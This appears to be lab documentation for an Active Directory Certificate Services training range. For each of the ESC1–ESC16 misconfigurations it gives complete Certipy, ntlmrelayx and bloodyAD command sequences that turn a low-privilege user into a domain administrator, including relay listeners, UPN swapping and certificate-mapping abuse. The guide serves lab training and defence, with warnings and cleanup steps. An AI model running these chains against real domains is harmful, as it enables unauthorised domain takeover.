---
title: ADCS Exploitation Scenarios
icon: fas fa-shield-halved
order: 12
---

This page documents the AD CS scenarios exposed by the ThruntOps provisioner.
They use the upstream `badsectorlabs.ludus_adcs` role pinned to **1.6.0** and
are intended only for an isolated lab you control. Provisioning and exploitation
change persistent AD/CA state. Do not run these procedures against production
or third-party systems.

Provision individual scenarios from the [Vulnerability Provision](../vulnerability-provision/)
page. The selected role runs on the DC, which also hosts the enterprise CA in
this lab.

## Prepare Kali

Install Certipy for AD CS testing (`certipy-ad` package on Kali) and ensure the
range has been provisioned and the DC is reachable. Replace `<range>` with the
range's subnet number and `<range_id>` with its Ludus range ID:

```bash
export DOMAIN=thruntops.domain
export NETBIOS=THRUNTOPS
export DC_IP=10.<range>.20.11
export CA_HOST=<range_id>-DC01-2022.thruntops.domain
export CA_NAME=thruntops-CA
export USER=domainuser
export PASSWORD=password
# Record these values from AD before changing an account UPN in the later steps.
export ESC9_ORIGINAL_UPN=esc9user
export ESC10_ORIGINAL_UPN=esc10user
export ESC16_ORIGINAL_UPN=esc16user
```

The domain user is the low-privilege requester unless a scenario below names a
dedicated test account. The CA host and common name follow the 2022 range
configuration and role defaults. Confirm actual values from the range and
`certipy find` output rather than assuming them if the config was customized.

Enumerate the CA and the templates visible to the requester:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -stdout -vulnerable
```

Use the exact CA and template names shown by this command. A successful
certificate request should report an issued certificate and save a `.pfx`; for
authentication scenarios, `certipy auth -pfx <file> -dc-ip "$DC_IP"` should
report a TGT. These are validation signals, not proof that every attack path
works under every Windows patch level or certificate-binding policy.

## Template and enrollment scenarios

### ESC1 — Enrollee supplies subject

The `ESC1` template allows a requester to supply an identity. Request a
certificate for the lab's domain administrator and authenticate with it:

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC1 \
  -upn domainadmin@thruntops.domain
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: a certificate with the requested UPN is saved, then Certipy obtains a
TGT for that identity. If the current DC requires a SID extension, use the
target account SID reported by AD and Certipy's `-sid` option only where the
template/CA accepts it. Remove the issued test certificate from the CA database
when finished; restore a snapshot to return the template to baseline.

### ESC2 — Any Purpose template

Enroll from `ESC2`, whose broad EKU can act as an enrollment-agent certificate,
then request a certificate on behalf of a user using an agent-enrollable
authentication template (the built-in `User` template is the usual target):

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC2
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User \
  -pfx domainuser.pfx -on-behalf-of "$NETBIOS\domainadmin"
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: the first request produces the agent PFX; the second produces a
certificate identifying `domainadmin`. CA enrollment-agent restrictions or
template availability can prevent the second request. Remove the issued
requests/certificates and restore a snapshot.

### ESC3 — Certificate Request Agent

`ESC3` publishes a request-agent-capable template. Request that certificate,
then use it to enroll on behalf of the test domain administrator:

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC3
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User \
  -pfx domainuser.pfx -on-behalf-of "$NETBIOS\domainadmin"
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: an agent PFX, an on-behalf-of certificate and (if the CA accepts the
request) a TGT for `domainadmin`. The separate `ESC3_CRA` option publishes the
upstream `ESC3_CRA` variant; use `-template ESC3_CRA` as the agent certificate
in the same sequence. Delete test certificates/requests and restore a snapshot.

### ESC4 — Template ACL control

The upstream role grants `Domain Users` `GenericAll` on template `ESC4`. Use
Certipy's template command to save the original configuration and make the
template enrollable as an ESC1-style template, then request and authenticate:

```bash
certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -template ESC4 -write-default-configuration
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC4 \
  -upn domainadmin@thruntops.domain
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: Certipy confirms the template update and request, followed by a TGT
when authentication succeeds. The update affects AD and is not undone by
disabling the provisioner flag. Preserve the generated template JSON and restore
it with Certipy's template restore operation or, preferably, revert a snapshot.

### ESC5 — CA directory-object permissions

In this upstream role's current implementation, the `esc5user` account is
created with password `ESC5password` and added to the Domain Admins group when
the role runs on the DC. This lab setup therefore exposes a direct membership
validation, not a standalone Certipy certificate-request technique:

```bash
certipy find -u "esc5user@$DOMAIN" -p 'ESC5password' \
  -dc-ip "$DC_IP" -target "$CA_HOST" -stdout -vulnerable
```

Expected: authentication as `esc5user` and enumeration of the CA. Verify its
group membership in AD before attributing access to a CA-object ACL. The
upstream account is persistent; remove it and any role-created group membership
or restore a snapshot after the exercise.

### ESC6 — CA accepts request-supplied SAN

The role enables the CA-wide SAN flag. Request a certificate using a template
that supports client authentication, supplying the domain administrator UPN:

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User \
  -upn domainadmin@thruntops.domain
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: the issued certificate contains the requested SAN. Whether it maps to
the administrator depends on DC certificate-binding policy and available
security extensions; a successful issuance alone is not successful
authentication. Restore the CA flag and snapshot after testing.

### ESC7 — CA officer and certificate manager rights

The role creates `esc7_camgr_user` and `esc7_certmgr_user`, both with password
`ESC7password`. The first gets **Manage CA**; the second gets **Manage
Certificates**. Use the CA manager to publish a template, then have a normal
enrollee submit a request:

```bash
certipy ca -u "esc7_camgr_user@$DOMAIN" -p 'ESC7password' \
  -dc-ip "$DC_IP" -target "$CA_HOST" -ca "$CA_NAME" -enable-template SubCA
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template SubCA \
  -upn domainadmin@thruntops.domain
certipy ca -u "esc7_certmgr_user@$DOMAIN" -p 'ESC7password' \
  -dc-ip "$DC_IP" -target "$CA_HOST" -ca "$CA_NAME" \
  -issue-request <request_id>
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -retrieve <request_id>
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP"
```

Expected: the CA manager can modify the published-template list and the
certificate manager can issue or deny requests. `SubCA` may not be published by
default. If the request is denied for enrollment permissions, note the request
ID and retain the private key Certipy saves; issue and retrieve only that lab
request. Do not approve unrelated requests. Remove test requests and restore
the CA configuration/snapshot.

## CA and certificate-mapping scenarios

### ESC8 — HTTP Web Enrollment relay

ESC8 enables the CA Web Enrollment endpoint. This is a relay scenario and needs
a separate, authorized NTLM authentication source; starting a relay listener
alone does not generate authentication. In a lab-only test, target the CA's
`/certsrv` endpoint with Impacket's AD CS relay mode and a template appropriate
to the relayed identity:

```bash
impacket-ntlmrelayx -t "http://$CA_HOST/certsrv/certfnsh.asp" \
  --adcs --template DomainController
```

Expected: only if a test identity authenticates to the listener and the CA
accepts enrollment, the relay tool reports a certificate and writes a PFX.
Triggering/coercing another host is intentionally not included here; use a
separately provisioned lab source and never relay real user traffic. Stop the
listener and remove issued test certificates.

### ESC9 — No SID security extension on a template

The role creates `esc9user` (`ESC9password`), grants Domain Users full control
over it, and publishes the `ESC9` template without the SID extension. In the
lab, temporarily change the test account's UPN, enroll, restore the original
UPN immediately, then try certificate authentication:

```bash
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc9user -upn domainadmin@thruntops.domain
certipy req -u "esc9user@$DOMAIN" -p 'ESC9password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC9
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc9user -upn "$ESC9_ORIGINAL_UPN"
certipy auth -pfx esc9user.pfx -dc-ip "$DC_IP"
```

Expected: the certificate omits the SID security extension; after UPN
restoration, weak DC binding may map it to the requested identity. The upstream
role sets the KDC binding prerequisite. Verify the account UPN is restored even
if enrollment fails, then delete the certificate and restore a snapshot.

### ESC10 case 1 — Weak Kerberos certificate binding

The role creates `esc10user` (default password `ESC10password`), grants Domain
Users full control over it, publishes `ESC10`, and sets
`StrongCertificateBindingEnforcement=0` on the DC. Follow the ESC9 sequence
using `esc10user` and template `ESC10`:

```bash
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc10user -upn domainadmin@thruntops.domain
certipy req -u "esc10user@$DOMAIN" -p 'ESC10password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC10
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc10user -upn "$ESC10_ORIGINAL_UPN"
certipy auth -pfx esc10user.pfx -dc-ip "$DC_IP"
```

Expected: if binding maps by UPN, Certipy obtains a TGT for the requested
administrator. Restore the original UPN immediately and revert the DC registry
setting by restoring a snapshot.

### ESC10 case 2 — Schannel UPN mapping

The role also sets `CertificateMappingMethods=0x04` on the DC. This case
demonstrates UPN-based Schannel mapping: change the dedicated `esc10user` UPN to
the target identity, enroll from an authentication-capable template, restore
the UPN, then test client-certificate authentication to LDAPS. It is not the
same Kerberos/PKINIT flow as case 1:

```bash
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc10user -upn domainadmin@thruntops.domain
certipy req -u "esc10user@$DOMAIN" -p 'ESC10password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc10user -upn "$ESC10_ORIGINAL_UPN"
certipy auth -pfx esc10user.pfx -dc-ip "$DC_IP" -ldap-shell
```

Expected: the certificate SAN identifies the temporarily assigned UPN and the
LDAP shell reports authentication as the mapped principal. Restore the original
UPN and revert the registry setting/snapshot after the test.

### ESC11 — RPC enrollment relay without encryption

ESC11 disables the CA RPC encryption requirement. This only creates a relay
opportunity; it does not create an incoming NTLM session. Start Certipy's RPC
relay listener against the CA, selecting a template the relayed principal can
enroll in:

```bash
certipy relay -target "rpc://$CA_HOST" -ca "$CA_NAME" \
  -template DomainController
```

Expected: Certipy listens on SMB and, only after receiving an authorized lab
NTLM authentication, reports an issued certificate. A DC account commonly
requires the `DomainController` template. Stop the relay and revoke/delete the
test certificate. Do not use live production authentication sources.

### ESC13 — Issuance policy linked to a privileged group

The role creates `esc13user` (`ESC13password`), group `esc13group`, and template
`ESC13`; it links the issuance policy to the group and configures the lab ACL
state. Enroll as the dedicated user and inspect the issued policy and resulting
authorization:

```bash
certipy req -u "esc13user@$DOMAIN" -p 'ESC13password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template ESC13
certipy cert -pfx esc13user.pfx -text
```

Expected: the certificate contains the `IssuancePolicyForESC13` policy OID.
Inspect it in the certificate output, then verify the policy maps to
`esc13group`. The role grants this group's `GenericAll` over Enterprise Admins;
the certificate-backed logon should carry the policy-linked group authorization.
Remove issued certs and the test group/user or restore a snapshot.

### ESC14 — Explicit certificate mapping

The role creates `esc14user` (`ESC14password`) and `esc14target`
(`ESC14targetPassword`), grants the former `GenericWrite` on the latter, weakens
KDC binding, and disables the CA SID extension. Enroll a certificate for the
actor from an authentication-capable template, inspect its subject, and use the
actor's delegated write to add a subject-based mapping to the target:

```bash
certipy req -u "esc14user@$DOMAIN" -p 'ESC14password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User
certipy cert -pfx esc14user.pfx -text
bloodyAD -H "$DC_IP" -d "$DOMAIN" -u esc14user -p 'ESC14password' \
  msldap modify "CN=esc14target,CN=Users,DC=thruntops,DC=domain" \
  altSecurityIdentities 'X509:<S>CN=esc14user'
certipy auth -pfx esc14user.pfx -dc-ip "$DC_IP" \
  -username esc14target -domain "$DOMAIN"
```

Use the certificate's actual subject in the mapping value if it differs from
`CN=esc14user`. Expected: authentication succeeds as `esc14target` only if the
mapping value exactly matches and the DC accepts that mapping form. Remove the
`altSecurityIdentities` value immediately after the test, revoke/delete the
certificate, and restore CA/KDC settings from a snapshot.

### ESC15 — Vulnerable WebServer template (CVE-2024-49019)

The role modifies the built-in `WebServer` template to the vulnerable
configuration. Confirm the vulnerable template with `certipy find`. ESC15
requires a vulnerable, unpatched CA and a V1 template that allows supplied
subjects. Request the Client Authentication application policy with the SAN:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -stdout -vulnerable
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template WebServer \
  -upn domainadmin@thruntops.domain \
  -application-policies 'Client Authentication'
certipy auth -pfx domainadmin.pfx -dc-ip "$DC_IP" -ldap-shell
```

Expected: on an unpatched CA, inspect the issued PFX with
`certipy cert -pfx domainadmin.pfx -text` and verify the requested application
policy is present; successful LDAP-shell authentication indicates Schannel
accepted the identity. If the CA is patched it should not honor the injected
policy. Revert the template from a snapshot and delete the test certificate.

### ESC16 — CA-wide SID security extension disabled

The role creates `esc16user` (default password `ESC16password`), grants Domain
Users full control over it, disables the SID security extension globally on
the CA, and sets weak KDC binding on the DC. Use any published client-auth
template after temporarily changing the test account UPN:

```bash
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc16user -upn domainadmin@thruntops.domain
certipy req -u "esc16user@$DOMAIN" -p 'ESC16password' -dc-ip "$DC_IP" \
  -target "$CA_HOST" -ca "$CA_NAME" -template User
certipy account update -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" \
  -user esc16user -upn "$ESC16_ORIGINAL_UPN"
certipy auth -pfx esc16user.pfx -dc-ip "$DC_IP"
```

Expected: the certificate has no SID security extension and weak binding may
allow the UPN mapping to the target. Restore the UPN even when requests fail;
restore CA/DC settings and revoke/delete the test certificate via snapshot or
scenario-specific cleanup.

## Coverage and cleanup

The provisioner supports ESC1–ESC9, ESC10 cases 1 and 2, ESC11, and ESC13–ESC16.
It does not expose ESC12 or ESC17; ESC10 is presented as two separately
selectable cases, and ESC3 has the additional `ESC3_CRA` template variant.
Provisioning is non-idempotent: setting a scenario flag to false does not undo
the AD CS changes. Some exercises also change DC/CA registry settings, user
UPNs, template ACLs or CA requests. Take a snapshot before testing, restore
temporary UPNs immediately, remove test requests/certificates and relay
listeners, then revert the snapshot for a known-clean baseline.

**References:** [Upstream Ludus ADCS role v1.6.0](https://github.com/badsectorlabs/ludus_adcs/tree/1.6.0) · [Certipy AD CS privilege-escalation guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) · [SpecterOps Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
